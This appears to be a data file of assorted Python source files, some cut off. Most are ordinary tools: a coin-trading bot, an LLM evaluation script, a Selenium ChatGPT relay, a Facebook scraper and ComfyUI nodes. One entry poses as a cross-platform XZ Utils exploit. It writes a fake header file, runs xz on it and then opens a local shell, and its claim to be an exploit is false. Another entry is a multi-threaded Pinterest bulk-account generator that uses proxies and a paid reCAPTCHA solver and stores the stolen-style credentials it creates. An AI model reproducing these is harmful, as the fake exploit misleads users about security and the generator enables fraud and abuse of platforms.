    "import requests\nimport json\nimport time\nfrom datetime import datetime\n\n\ndef delay():\n    time.sleep(0.5)\n\n\nclass AutoCoin:\n    def __init__(self):\n        # \uc785\ub825 \ubc1b\ub294 \uac12\n        self.username = input(\"\ubd80\ub9c8\uc704\ud0a4 \uc544\uc774\ub514 \uc785\ub825: \")\n        self.password = input(\"\ubd80\ub9c8\uc704\ud0a4 \ube44\ubc00\ubc88\ud638 \uc785\ub825: \")\n        self.want_buy_price = input(\"\uc6d0\ud558\ub294 \ub9e4\uc218 \uac00\uaca9 \uc544\ub798\ub85c: \")\n        self.want_sell_price = input(\"\uc6d0\ud558\ub294 \ub9e4\ub3c4 \uac00\uaca9 \uc704\ub85c: \")\n\n        self.access_token = None\n        self.access_refreshToken = None\n\n        self.price = 0\n        self.property = 0  # \ud604\uc7ac \uc7ac\uc0b0\n        self.have_coins = 0  # \ud604\uc7ac \ubcf4\uc720 \ucf54\uc778 \uc218\n\n        # URL list\n        self.urls = {\n            \"bsm_login\": \"https://auth.bssm.kro.kr/api/auth/login\",  # \ubd80\ub9c8\uc704\ud0a4\uc5d0 \uc811\uadfc\ud558\uae30 \uc704\ud55c token \uac00\uc838\uc634\n            \"bsm_auth_token\": \"https://auth.bssm.kro.kr/api/oauth/authorize\",  # bsm token\n            \"buma_auth_token\": \"https://buma.wiki/api/auth/oauth/bsm\",  # buman token\n            \"mine\": \"https://buma.wiki/api/coins/mine\",\n            \"coin_price\": \"https://buma.wiki/api/coins/prices\",  # \ubd80\ub9c8\uc704\ud0a4 \ucf54\uc778 \uac00\uaca9 \ud655\uc778\n            \"buy_coin\": \"https://buma.wiki/api/coins/buy\",  # \ucf54\uc778 \ub9e4\uc218\n            \"sell_coin\": \"https://buma.wiki/api/coins/sell\"  # \ucf54\uc778 \ub9e4\ub3c4\n        }\n\n    def show_user_info(self):  # \uc720\uc800\uac00 \uc785\ub825\ud55c \uc815\ubcf4 \ud655\uc778\ud558\ub294 \ud398\uc774\uc9c0\n        text = f\"\"\"\n        \\n\n        ## \uc785\ub825\ub41c \uc815\ubcf4\ub294 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. ## \n\n        \uc720\uc800 \uc774\ub984: {self.username}\n        \uc6d0\ud558\ub294 \ub9e4\uc218 \uac00\uaca9 \uc774\ud558 \uac12: {self.want_buy_price}\n        \uc6d0\ud558\ub294 \ub9e4\ub3c4 \uac00\uaca9 \uc774\uc0c1 \uac12: {self.want_sell_price}\n\n        \"\"\"\n        print(text)\n\n    def main(self):  # \ubd80\ub9c8\uc704\ud0a4 \ub85c\uadf8\uc778 \ud568\uc218\n        try:\n            login_data = {\n                \"id\": str(self.username),\n                \"pw\": str(self.password)\n            }\n            login_response = requests.post(str(self.urls[\"bsm_login\"]), json=login_data)\n\n            if login_response.status_code == 200:\n                login_json_response = login_response.json()\n                self.access_token = login_json_response.get(\"accessToken\")\n                self.access_refreshToken = login_json_response.get(\"refreshToken\")\n\n                # self.show_user_info()\n\n                self.get_token()\n                self.mine()\n                self.get_coin_price()\n\n                if self.price <= int(self.want_buy_price):\n                    self.buy()\n\n                if self.price >= int(self.want_sell_price):\n                    self.sell()\n\n                time.sleep(180)\n\n            else:\n                print(\"\uc720\uc800 \uc815\ubcf4\ub97c \ub2e4\uc2dc \ud655\uc778 \ubc14\ub78d\ub2c8\ub2e4.\")\n                exit()\n\n        except requests.exceptions.RequestException as e:\n            print(\"\uc11c\ubc84\uc5d0 \uc5f0\uacb0\ud560 \uc218 \uc5c6\uc74c.\")\n\n    def get_token(self):  # \ud1a0\ud070 \uac00\uc838\uc624\ub294 \ud568\uc218\n        headers = {\n            'Cookie': f'bsm_auth_refresh_token_v1={self.access_refreshToken}; bsm_auth_token_v1={self.access_token}',\n        }\n\n        data = {\"clientId\": \"22fb2e30\", \"redirectURI\": \"https://buma.wiki/oauth\"}\n        response_auth = requests.post(self.urls[\"bsm_auth_token\"], headers=headers, json=data)\n\n        text = response_auth.text\n        result = text[45:77]\n\n        # token \uc694\uccad\n        headers = {\n            'Cookie': f'bsm_auth_refresh_token_v1={self.access_refreshToken}; bsm_auth_token_v1={self.access_token}',\n            'Authcode': f'{result}',\n        }\n\n        data = {\"clientId\": \"22fb2e30\", \"redirectURI\": \"https://buma.wiki/oauth\"}\n        response_token = requests.post(self.urls[\"buma_auth_token\"], json=data, headers=headers)\n\n        data = response_token.text\n        parsed_data = json.loads(data)\n\n        self.access_token = parsed_data[\"accessToken\"]\n        # print(self.access_token) token \ud655\uc778\n\n    def get_coin_price(self):  # \ucf54\uc778 \uac00\uaca9 \uac00\uc838\uc624\ub294 \ud568\uc218\n        response = requests.get(self.urls[\"coin_price\"])\n\n        if response.status_code == 200:\n            json_data = response.json()\n            self.price = json_data[\"price\"]\n            print(f\"{datetime.now()}  \ucf54\uc778 \uac00\uaca9: {self.price}\")\n        else:\n            print('Failed to retrieve the page. Status code:', response.status_code)\n\n    def mine(self):\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        response = requests.get(self.urls[\"mine\"], headers=headers)\n\n        if response.status_code == 200:\n            json_data = response.json()\n            self.property = json_data[\"money\"]\n            self.have_coins = json_data[\"coin\"]\n        else:\n            print('Failed to retrieve the page. Status code:', response.status_code)\n\n    def buy(self):  # \ub9e4\uc218 \ud568\uc218\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        coin_data = {\n            'coinPrice': self.price,\n            'coinCount': self.property // self.price  # \uc804\uc7ac\uc0b0 // \ud604\uc7ac \uac00\uaca9 = \ud480\ub9e4\uc218\n        }\n\n        coin_response = requests.post(self.urls[\"buy_coin\"], json=coin_data, headers=headers)\n\n        if coin_response.status_code == 200:\n            print(f\"- \ucf54\uc778\uc744 {self.property // self.price}\uc8fc \ub9e4\uc218\ud558\uc600\uc2b5\ub2c8\ub2e4.\\n\")\n\n    def sell(self):  # \ub9e4\ub3c4 \ud568\uc218\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        coin_data = {\n            'coinCount': self.have_coins,\n            'coinPrice': self.price\n      ",
    "import subprocess\nimport os\nimport platform\n\n# Create the exploit file\nexploit_content = \"\"\"\n/*\n * Copyright (c) 2010-2020 XZ Utils\n *\n * Author: Lasse Collin\n *\n * This file has been put into the public domain.\n * You can do whatever you want with this file.\n *\n * See ../README for more details.\n * https://github.com/AiGptCode/Xz_vulnerability_crossplatform\n */\n\n#ifndef XZ_UTILS_H\n#define XZ_UTILS_H\n#define XX 0\n#define __x() XX\n\"\"\"\n\nwith open(\"exploit.txt\", \"w\") as exploit_file:\n    exploit_file.write(exploit_content)\n\n# Create a symbolic link or hard link depending on the OS\nif platform.system() == 'Windows':\n    if os.symlink in os.supports_symlinks:\n        os.symlink(os.path.realpath('exploit.txt'), 'exploit_link')\n    else:\n        os.link(os.path.realpath('exploit.txt'), 'exploit_link')\nelse:\n    os.symlink(os.path.realpath('exploit.txt'), 'exploit_link')\n\n# Define the exploit commands based on the OS\ncmds = []\nif platform.system() == 'Linux' or platform.system() == 'Darwin':\n    pthread_lib = 'libpthread.so'  # Use default name and let dynamic linker search for it\n    cmds = [\n        [\"LD_PRELOAD={} xz -v exploit_link\".format(pthread_lib)],\n        [\"xzgv exploit_link\"]\n    ]\nelif platform.system() == 'Windows':\n    cmds = [\n        [\"xz -v exploit_link\"],\n        [\"xzgv exploit_link\"]\n    ]\nelse:\n    print(\"Unsupported operating system.\")\n    quit()\n\n# Run the exploit commands with the malicious input file\nfor cmd in cmds:\n    input_file = \"exploit_link\"\n    try:\n        output = subprocess.check_output(cmd, stdin=open(input_file, 'r'), stderr=subprocess.STDOUT, universal_newlines=True)\n        print(output)\n    except subprocess.CalledProcessError as error:\n        print(error.output)\n\n# Post-exploitation: Open a command shell based on the OS\npost_exploit_cmd = \"\"\nif platform.system() == 'Linux' or platform.system() == 'Darwin':\n    post_exploit_cmd = \"/bin/bash\"\nelif platform.system() == 'Windows':\n    post_exploit_cmd = \"cmd\"\nelse:\n    print(\"Unsupported operating system.\")\n    quit()\n\nsubprocess.Popen(post_exploit_cmd, shell=True)\n",
    "from pathlib import Path\nimport os\nimport fire\nimport jsonlines\nimport json\n\nfrom transformers import AutoModelForCausalLM, AutoTokenizer, pipeline\nfrom tqdm import tqdm\nfrom batched_chatgpt import call_chatgpt\nimport torch\n\n\ndef main(\n    model_name,\n    save_name,\n    eval_set_path,\n    output_dir,\n    model_type,\n    debug: bool = False\n):\n    # check if save path is safe\n    save_path = Path(output_dir) / save_name\n    save_path = save_path.with_suffix(\".jsonl\")\n    if save_path.exists():\n        raise FileExistsError(f\"{save_path} exists!\")\n\n    print(\"=== model name ===\")\n    print(model_name)\n    print(\"===    ====    ===\")\n    print(os.getcwd())\n\n    # prepare evaluation set\n    eval_set = [e for e in jsonlines.open(eval_set_path).iter()]\n    eval_set = eval_set[:12] if debug else eval_set\n\n    generated_answers = []\n\n    if model_type == 'openai':\n        input_texts = [f\"{e['instruction']}\\n\\n{e['instances'][0]['input']}\" for e in eval_set]\n        generated_answers = call_chatgpt(input_texts, chunk_size=20, model_name=model_name)\n    else:\n        # for multi-GPU inference\n        try:\n            print(f\"{os.environ['LOCAL_RANK']=}\")\n            print(f\"{os.environ['WORLD_SIZE']=}\")\n            local_rank = int(os.environ['LOCAL_RANK'])\n            world_size = int(os.environ['WORLD_SIZE'])\n            eval_set = eval_set[local_rank::world_size]\n            save_path = (save_path.parent / (save_path.stem + f'-rank{local_rank}')).with_suffix('.jsonl')\n            device = f\"cuda:{local_rank}\"\n        except KeyError:\n            device = \"cuda\"\n\n        # This models need special generation strategy\n        if model_type in ['solar', 'mistral', 'kullm', 'koalpaca_v1_1b', 'hyundai_llm']:\n            # There exists more simple way, but let us move fast.\n            # model, tokenizer load\n            try:\n                model = AutoModelForCausalLM.from_pretrained(\n                    model_name,\n                    torch_dtype='auto',\n                    attn_implementation='sdpa').to(device)\n            except ValueError:\n                model = AutoModelForCausalLM.from_pretrained(\n                    model_name,\n                    torch_dtype='auto').to(device)\n            tokenizer = AutoTokenizer.from_pretrained(model_name)\n\n            # building input text\n            # solar uses apply_chat_template but kullm doesn't\n            if model_type == 'solar' or model_type == 'mistral':\n                input_texts = [f\"{e['instruction']}\\n\\n{e['instances'][0]['input']}\" for e in eval_set]\n                input_template_texts = [tokenizer.apply_chat_template(\n                    [{\"role\": \"user\", \"content\": t}], tokenize=False, add_generation_prompt=True) for t in input_texts]\n\n            elif model_type in ['kullm', 'koalpaca_v1_1b', 'hyundai_llm']:\n                # for generate\n                model.config.pad_token_id = model.config.eos_token_id\n\n                with open(f\"lm_templates/{model_type}.json\", 'rt') as f:\n                    template = json.load(f)\n\n                input_template_texts = []\n                for e in eval_set:\n                    if e['instances'][0]['input']:\n                        input_text = template['prompt_input'].format_map({\n                            'instruction': e['instruction'],\n                            'input': e['instances'][0]['input']\n                        })\n                    else:\n                        input_text = template['prompt_no_input'].format_map({\n                            'instruction': e['instruction'],\n                        })\n                    input_template_texts.append(input_text)\n            else:\n                raise NotImplementedError\n\n            input_ids = [tokenizer(e, return_tensors='pt')[\"input_ids\"].to(model.device) for e in input_template_texts]\n\n            # do generation\n            if not tokenizer.pad_token_id and tokenizer.eos_token_id:\n                tokenizer.pad_token_id = tokenizer.eos_token_id\n            for item in tqdm(input_ids):\n                res = model.generate(\n                    item,\n                    use_cache=True,\n                    max_new_tokens=min(2048-len(item[0]), 512),\n                    eos_token_id=tokenizer.eos_token_id,\n                    pad_token_id=tokenizer.pad_token_id,\n                    do_sample=False,\n                )\n                try:\n                    model_answer = tokenizer.decode(res[0][len(item[0]):], skip_special_tokens=True)\n                except IndexError:\n                    print(\"model generate nothing!! Full model answer:\")\n                    model_answer = \"(no answer from model)\"  # Some models rarely generate nothing.\n\n                generated_answers.append(model_answer)\n                if debug:\n                    print(model_answer)\n        else:\n            print(f\"model_type: {model_type}, use default chat template.\")\n            model = AutoModelForCausalLM.from_pretrained(model_name, torch_dtype=\"auto\", attn_imple",
    "#@Autor: Felipe Frechiani de Oliveira\n#Este programa acessa o site do chatgpt e faz uma pergunta e captura a resposta por meio de um servidor do selenium.\n#Somente funcionou usando o firefox com o chrome n\u00e3o funcionou.  \n\nfrom selenium import webdriver\nimport time\nfrom selenium.common.exceptions import NoSuchElementException\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.firefox.options import Options\nfrom selenium.webdriver.common.action_chains import ActionChains\n\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\nfrom urllib.parse import urlparse, parse_qs\n\n\n\n\n\n# Fun\u00e7\u00e3o para fazer uma pergunta ao ChatGPT\ndef ask_gpt(question):\n\n    # Configura\u00e7\u00f5es do Selenium para se conectar a um servi\u00e7o Selenium remoto\n    selenium_host = 'selenium'  # Atualize com o endere\u00e7o IP ou o nome do host do seu servi\u00e7o Selenium remoto\n    selenium_port = '4444'  # Atualize com a porta em que o servi\u00e7o Selenium remoto est\u00e1 sendo executado\n    # URL da p\u00e1gina do ChatGPT\n    url = \"https://chat.openai.com/\"\n    print(\"Accessando url do chatgpt:\" + url)\n    print(\"Usando o broswer firefox...\")\n    # Configura\u00e7\u00e3o do WebDriver remoto\n    webdriver_remote_url = f\"http://{selenium_host}:{selenium_port}/wd/hub\"\n    print(\"Roda do selenium:\" + webdriver_remote_url)\n    firefox_options = Options()\n    browser = webdriver.Remote(webdriver_remote_url, options=firefox_options)\n\n    # Abre a p\u00e1gina do ChatGPT\n    try:   \n\n        browser.get(url)\n        print(\"URL da pagina:\" + browser.current_url)\n        print(\"Titulo da pagina:\" + browser.title)\n        time.sleep(2)  # Espera 3 segundos para garantir que a p\u00e1gina esteja carregada\n        # Insere a pergunta no campo de entrada\n        if browser is not None:       \n            input_field = browser.find_element(By.ID , \"prompt-textarea\")\n            #print(input_field)\n            actions = ActionChains(browser)\n            # Clica no bot\u00e3o\n            actions.click(input_field).perform()\n            input_field.send_keys(question)\n            # Clica no bot\u00e3o de enviar\n            submit_button = browser.find_element(By.XPATH , '//button[@data-testid=\"send-button\"]')\n            time.sleep(1)  # Espera 5 segundos para a resposta ser gerada\n            browser.save_screenshot(\"tela_antes_da_resposta.png\")\n            submit_button.click()\n            print(\"aguardando resposta\")\n            # Aguarda a resposta do ChatGPT\n            time.sleep(4)  # Espera 5 segundos para a resposta ser gerada\n            browser.save_screenshot(\"tela_depois_da_resposta.png\")\n            # Obt\u00e9m a resposta\n            response = browser.find_element(By.XPATH ,'//div[@data-message-author-role=\"assistant\"]').text\n            return response\n    except NoSuchElementException:\n        print(\"Elemento n\u00e3o encontrado na p\u00e1gina.\")   \n    \n\nclass RequestHandler(BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        post_params = parse_qs(post_data.decode('utf-8'))\n\n        if 'question' in post_params:\n            question = post_params['question'][0]\n            response = ask_gpt(question)  # Suponha que get_gpt_response seja sua fun\u00e7\u00e3o para interagir com o ChatGPT\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            self.wfile.write(json.dumps({'response': response}).encode())\n        else:\n            self.send_response(400)\n            self.end_headers()\n            self.wfile.write(b'Bad Request')\n\ndef run(server_class=HTTPServer, handler_class=RequestHandler, port=8000):\n    server_address = ('', port)\n    httpd = server_class(server_address, handler_class)\n    print(f'Starting server on port {port}...')\n    httpd.serve_forever()\n    \n    \n    \n    \n\nif __name__ == \"__main__\":\n    run()\n\n\n\n\n",
    "#!env python\n#\n#  Purpose: Collect all the actions that preceed a code spelunking\n#  session into a single script file.  Note, this script MUST be\n#  executed from the root of where you wish to work.  This script can\n#  take many minutes if executed over a large code base, for example\n#  starting it in FreeBSD's /usr/src directory.\n\n# Use option parsing.  Right now we have one option, which is whether\n# or not we're looking at a kernel code base.  This is important to\n# cscope because it will normally use /usr/include unless the -k\n# (kernel) option is used.\n\n# Redefine these to find the correct programs\n\ncscope=\"/opt/homebrew/bin/cscope\"\ngtags=\"/opt/homebrew/bin/gtags\"\nhtags=\"/opt/homebrew/bin/htags\"\ndoxygen=\"/opt/homebrew/bin/doxygen\"\n\nimport sys\nimport os\n\ndef main():\n\n    from optparse import OptionParser\n    \n    parser = OptionParser()\n    parser.add_option(\"-k\", \"--kernel\",\n                      action=\"store_true\", dest=\"kernel\", default=False,\n                      help=\"kernel code, do not use /usr/include with cscope\")\n    parser.add_option(\"-d\", \"--doxygen\",\n                      action=\"store_true\", dest=\"doxygen\", default=False,\n                      help=\"build doxygen output\")\n    parser.add_option(\"-c\", \"--cscope\",\n                      action=\"store_true\", dest=\"cscope\", default=False,\n                      help=\"generate cscope database\")\n    parser.add_option(\"-w\", \"--web\",\n                      action=\"store_true\", dest=\"web\", default=False,\n                      help=\"build web pages as well\")\n    parser.add_option(\"-t\", \"--title\",\n                      dest=\"title\", default=None,\n                      help=\"title to give to web pages\")\n    \n    (options, args) = parser.parse_args()\n    \n    # Execute Doxygen, cscope and then gtags/htags.\n    # We use this ordering because if you select Doxygen but have no\n    # Doxyfile then we want to bail early and force you to update the\n    # Doxyfile before re-executing.\n\n    if (options.doxygen == True):\n        if (not os.path.exists(\"Doxyfile\")):\n            exit_status = os.spawnlp(os.P_WAIT, doxygen, 'doxygen', '-g')\n            print(\"doxygen option selected but no DoxyFile\")\n            if (os.path.exists(\"Doxyfile\")):\n                print(\"Doxyfile created.  Please update Doxyfile and re-run either %s or run doxygen directly\" % sys.argv[0])\n            sys.exit(1)\n        else:\n            exit_status = os.spawnlp(os.P_WAIT, doxygen, 'doxygen', 'Doxyfile')\n            if (exit_status == 0):\n                print(\"doxygen complete\")\n            else:\n                print(\"doxygen failed\")\n                sys.exit(1)\n            \n    if (options.cscope == True):\n        if (options.kernel == True):\n            exit_status = os.spawnlp(os.P_WAIT, cscope, 'cscope', '-R', '-q', '-b', '-k')\n        else:\n            exit_status = os.spawnlp(os.P_WAIT, cscope, 'cscope', '-R', '-q', '-b')\n        if (exit_status == 0):\n            print(\"cscope complete\")\n        else:\n            print(\"cscope failed\")\n            sys.exit(1)\n\n    exit_status = os.spawnlp(os.P_WAIT, gtags, 'gtags')\n\n    if (exit_status == 0):\n        print(\"gtags complete\")\n    else:\n        print(\"gtags failed\")\n        sys.exit(1)\n\n    if (options.web == True):\n        if (options.title != None):\n            exit_status = os.spawnlp(os.P_WAIT, htags, 'htags', \n                                     '--line-number', '--symbol',\n                                     '--title', options.title)\n        else:\n            exit_status = os.spawnlp(os.P_WAIT, htags, 'htags',\n                                 '--line-number', '--symbol')\n        if (exit_status == 0):\n            print(\"htags complete\")\n        else:\n            print(\"htags failed\")\n            sys.exit(1)\n\n    print(\"ready to spelunk\")\n\n# Call the main function.\nmain()\n",
    "# -*- coding: utf-8 -*-\nfrom fb_graphql_scraper.utils.locator import *\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.webdriver.common.action_chains import ActionChains\nfrom selenium.webdriver.common.keys import Keys\nimport time\n\n\nclass PageOptional(object):\n    def __init__(self, driver=None, fb_account: str = None, fb_pwd: str = None):\n        self.locator = PageLocators\n        self.xpath_elements = PageXpath\n        self.class_elements = PageClass\n        self.page_text = PageText\n        self.driver = driver\n        self.fb_account = fb_account\n        self.fb_pwd = fb_pwd\n\n        # Loggin account\n        if self.fb_account and self.fb_pwd:\n            login_page_url = \"https://www.facebook.com/login\"\n            self.driver.get(url=login_page_url)\n            self.login_page()\n\n    def login_page(self):\n        try:\n            self.login_account(user=self.fb_account, \n                               password=self.fb_pwd,\n            )\n            time.sleep(5)\n        except Exception as e:\n            print(f\"Login faield, message: {e}\")\n\n    def clean_requests(self):\n        print(f\"Before cleaning driver requests, the number of requests are: {len(self.driver.requests)}\")\n        try:\n            print(\"Try to clear driver requests..\")\n            del self.driver.requests\n            print(f\"Clear, the number of requests are: {len(self.driver.requests)}\")\n        except Exception as e:\n            print(f\"Clear unsuccessfully, message: {e}\")\n\n    def get_in_url(self):\n        self.driver.get(url=self.url)\n\n    def login_account(self, user: str, password: str):\n        user_element = self.driver.find_element(By.NAME, \"email\")\n        user_element.send_keys(user)\n        password_element = self.driver.find_element(By.NAME, \"pass\")\n        password_element.send_keys(password)\n        password_element.send_keys(Keys.ENTER)\n\n    def scroll_window(self):\n        self.driver.execute_script(\n            \"window.scrollTo(0,document.body.scrollHeight)\")\n\n    def scroll_window_with_parameter(self, parameter_in: str):\n        self.driver.execute_script(f\"window.scrollBy(0, {parameter_in});\")\n\n    def set_browser_zoom_percent(self, zoom_percent: int):\n        zoom_percent = str(zoom_percent)\n        self.driver.execute_script(\n            f\"document.body.style.zoom='{zoom_percent}%'\")\n\n    def move_to_element(self, element_in):\n        ActionChains(self.driver).move_to_element(element_in).perform()\n\n    def load_next_page(self, url:str, clear_limit:int=20):\n        \"\"\">> Move on to target facebook user page,\n        before moving, clean driver's requests first,\n        or driver would store previous account's data.\n        Args: url (str): user(kol) links\"\"\"\n        i = 0\n        while i <= clear_limit:\n            self.clean_requests()\n            if len(self.driver.requests) == 0:\n                print(\"Clear all driver requests already!\")\n                break\n            i += 1\n        self.driver.get(url=url)\n\n    def click_display_button(self):\n        elements = self.driver.find_elements(self.locator.DISPLAY_MORE)\n        for _ in range(10):\n            for each_element in elements:\n                if each_element.text == self.page_text.DISPLAY_MORE or each_element.text == self.page_text.DISPLAY_MORE2:\n                    self.move_to_element(element_in=each_element)\n                    self.scroll_window_with_parameter(parameter_in=\"500\")\n                    try:\n                        each_element.click()\n                        elements = self.driver.find_elements(\n                            self.locator.DISPLAY_MORE)\n                    except Exception as e:\n                        print(\n                            f\"Click display more unsucessfully, error message:\\n{e}\")\n\n    def click_display_button2(self):\n        display_more_xpath = f\"//div[@class='{PageClass.DISPLAY_MORE}' and @role='{PageRoleValue.DISPLAY_MORE}' and text()='{PageText.DISPLAY_MORE}']\"\n        elements = self.driver.find_elements(By.XPATH, display_more_xpath)\n        for _ in range(10):\n            for each_element in elements:\n                if each_element.text == self.page_text.DISPLAY_MORE or each_element.text == self.page_text.DISPLAY_MORE2:\n                    self.move_to_element(element_in=each_element)\n                    self.scroll_window_with_parameter(parameter_in=\"500\")\n                    try:\n                        each_element.click()\n                        elements = self.driver.find_elements(\n                            self.locator.DISPLAY_MORE)\n                    except Exception as e:\n                        print(\n                            f\"Click display more unsucessfully, error message:\\n{e}\")\n\n    def click_reject_login_button(self):\n        try:\n            reject_login_button = WebDriverWait(self.driver, 10).until(\n            EC.visibility_of_element_located((",
    "import json\r\nimport random\r\nimport threading\r\nimport time\r\n\r\nimport capsolver\r\nimport loguru\r\nimport requests\r\nimport modules.internxt as internxt\r\n\r\ncapsolver.api_key = json.loads(open(\"settings.json\",\"r\").read())[\"capsolver_key\"]\r\nclass P\u0131nterestGen:\r\n    def __init__(self):\r\n        self.session = requests.session()\r\n\r\n        self.session.headers = {\r\n            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',\r\n            'accept-language': 'tr-TR,tr;q=0.6',\r\n            'cache-control': 'no-cache',\r\n            'pragma': 'no-cache',\r\n            'sec-ch-ua': '\"Brave\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"',\r\n            'sec-ch-ua-mobile': '?0',\r\n            'sec-ch-ua-platform': '\"Windows\"',\r\n            'sec-fetch-dest': 'document',\r\n            'sec-fetch-mode': 'navigate',\r\n            'sec-fetch-site': 'none',\r\n            'sec-fetch-user': '?1',\r\n            'sec-gpc': '1',\r\n            'upgrade-insecure-requests': '1',\r\n            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',\r\n        }\r\n        self.internxtmailapi = internxt.Internxt()\r\n        self.email, self.emailToken = self.internxtmailapi.get_new_mail()\r\n        self.accountPassw = \"\".join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+=-') for i in range(10)])\r\n\r\n        proxy = random.choice(open(\"proxies.txt\").readlines()).strip()\r\n        self.session.proxies = {'http': 'http://' + proxy, 'https': 'http://' + proxy}\r\n\r\n\r\n    def get_csrf(self):\r\n        response = self.session.get('https://tr.pinterest.com/')\r\n        self.session.headers['x-csrftoken'] = response.cookies['csrftoken']\r\n        self.session.headers['x-pinterest-appstate'] = 'active'\r\n        self.session.headers['x-pinterest-pws-handler'] = 'www/index.js'\r\n        self.session.headers['x-pinterest-source-url'] = '/'\r\n        self.session.headers['x-requested-with'] = 'XMLHttpRequest'\r\n    def get_bday(self):\r\n        current_year = time.localtime().tm_year\r\n        random_years_ago = random.randint(18, 30)\r\n        selected_year = current_year - random_years_ago\r\n\r\n        start_time = time.mktime((selected_year, 1, 1, 0, 0, 0, 0, 0, 0))\r\n        end_time = time.mktime((selected_year + 1, 1, 1, 0, 0, 0, 0, 0, 0))\r\n\r\n        random_epoch = random.randint(int(start_time), int(end_time))\r\n        return random_epoch\r\n    def solve_recaptcha(self):\r\n        captcha_token = capsolver.solve(\r\n            {\r\n                \"type\": \"ReCaptchaV3EnterpriseTaskProxyless\",\r\n                \"websiteURL\": \"https://tr.pinterest.com\",\r\n                \"websiteKey\": \"6Ldx7ZkUAAAAAF3SZ05DRL2Kdh911tCa3qFP0-0r\",\r\n                \"apiDomain\": \"www.recaptcha.net\",\r\n                \"pageAction\": \"web_unauth\"\r\n            }\r\n        )[\"gRecaptchaResponse\"]\r\n        loguru.logger.info(f\"Captcha solved, {captcha_token[:50]}..\")\r\n        return captcha_token\r\n    def send_signup_req(self):\r\n        data = {\r\n            'source_url': '/',\r\n            'data': json.dumps({\"options\":{\"type\":\"email\",\"birthday\":int(self.get_bday()),\"email\":self.email,\"password\":self.accountPassw,\"country\":\"US\",\"first_name\":\"Alita\",\"last_name\":\"\",\"recaptchaV3Token\":self.solve_recaptcha(),\"visited_pages\":json.dumps([{\"path\":\"/\",\"pageType\":\"home\",\"ts\":int(str(time.time()).replace(\".\",\"\")[:13])}]),\"user_behavior_data\":\"{}\"},\"context\":{}})\r\n        }\r\n\r\n        response = self.session.post('https://tr.pinterest.com/resource/UserRegisterResource/create/',data=data)\r\n        if response.json()[\"resource_response\"][\"status\"] == \"success\":\r\n            loguru.logger.success(f\"[{self.email}] Account created successfully.\")\r\n\r\n        pinterest_sess_cookie = self.session.cookies[\"_pinterest_sess\"]\r\n\r\n        open(\"accounts.txt\",\"a\").write(f\"{self.email}:{self.accountPassw}:{pinterest_sess_cookie}\\n\")\r\n\r\ndef handle_tread():\r\n    while True:\r\n        pin = P\u0131nterestGen()\r\n        pin.get_csrf()\r\n        pin.send_signup_req()\r\n\r\nif __name__ == '__main__':\r\n    thread_count = input(\"how much thread? > \")\r\n    for i in range(int(thread_count)):\r\n        threading.Thread(target=handle_tread).start()",
    "import comfy\nimport folder_paths\nimport math\nimport torch\nfrom PIL import Image\nimport numpy as np\nfrom io import BytesIO\nimport base64\n\nfrom .prompt_control import ScheduleToCond, ScheduleToModel, PromptToSchedule\n\nclass UNETLoaderCAP:\n\t@classmethod\n\tdef INPUT_TYPES(s):\n\t\treturn {\"required\": { \"unet_name\": (\"STRING\", {\"multiline\": False}),\n\t\t\t\t\t\t\t }}\n\tRETURN_TYPES = (\"MODEL\",)\n\tFUNCTION = \"load_unet\"\n\n\tCATEGORY = \"advanced/loaders\"\n\n\tdef load_unet(self, unet_name):\n\t\tunet_path = folder_paths.get_full_path(\"unet\", unet_name)\n\t\tmodel = comfy.sd.load_unet(unet_path)\n\t\treturn (model,)\n\nclass CLIPLoaderCAP:\n\t@classmethod\n\tdef INPUT_TYPES(s):\n\t\treturn {\"required\": { \"clip_name\": (\"STRING\", {\"multiline\": False}),\n\t\t\t\t\t\t\t  \"type\": ([\"stable_diffusion\", \"stable_cascade\"], ),\n\t\t\t\t\t\t\t }}\n\tRETURN_TYPES = (\"CLIP\",)\n\tFUNCTION = \"load_clip\"\n\n\tCATEGORY = \"advanced/loaders\"\n\n\tdef load_clip(self, clip_name, type=\"stable_diffusion\"):\n\t\tclip_type = comfy.sd.CLIPType.STABLE_DIFFUSION\n\t\tif type == \"stable_cascade\":\n\t\t\tclip_type = comfy.sd.CLIPType.STABLE_CASCADE\n\n\t\tclip_path = folder_paths.get_full_path(\"clip\", clip_name)\n\t\tclip = comfy.sd.load_clip(ckpt_paths=[clip_path], embedding_directory=folder_paths.get_folder_paths(\"embeddings\"), clip_type=clip_type)\n\t\treturn (clip,)\n\ndef conv_pil_tensor(img):\n\treturn (torch.from_numpy(np.array(img).astype(np.float32) / 255.0).unsqueeze(0),)\n\ndef conv_tensor_pil(tsr):\n\treturn Image.fromarray(np.clip(255. * tsr.cpu().numpy().squeeze(), 0, 255).astype(np.uint8))\n\nclass B64Decoder:\n\t@classmethod\n\tdef INPUT_TYPES(s):\n\t\treturn {\n\t\t\t\"required\": {\"base64_image\": (\"STRING\", {\"multiline\": False})}\n\t\t}\n\tRETURN_TYPES = (\"IMAGE\",)\n\tFUNCTION = \"load_image\"\n\n\tCATEGORY = \"api/image\"\n\n\tdef load_image(self, base64_image):\n\t\timg_data = base64.b64decode(base64_image)\n\t\tpil_img = Image.open(BytesIO(img_data))\n\t\treturn conv_pil_tensor(pil_img.convert(\"RGB\"))\n\nNODE_CLASS_MAPPINGS = {\n\t\"UNETLoaderCAPGUI\": UNETLoaderCAP,\n\t\"CLIPLoaderCAPGUI\": CLIPLoaderCAP,\n\t\"Base64ToImageCAPGUI\": 